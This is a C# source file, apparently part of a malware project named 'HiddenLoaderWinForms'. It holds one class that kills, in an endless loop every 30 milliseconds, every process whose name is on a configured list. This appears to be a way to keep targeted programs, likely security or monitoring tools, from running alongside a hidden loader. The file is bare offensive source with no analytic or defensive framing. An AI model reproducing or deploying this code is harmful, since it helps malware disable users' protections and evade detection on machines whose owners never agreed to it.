using System.Diagnostics;
using System.Threading.Tasks;

namespace HiddenLoaderWinForms
{
    public class ProcessKiller
    {
        public static Task KillProcess()
        {
            while (true)
            {
                for (int i = 0; i < Config.ProcessNames.Length; i++)
                {
                    var processName = Config.ProcessNames[i];
                    foreach (Process proc in Process.GetProcessesByName(processName))
                    {
                        proc.Kill();
                    }

                    if (i > Config.ProcessNames.Length)
                    {
                        i = 0;
                    }
                }
                System.Threading.Thread.Sleep(30);
            }
        }
    }
}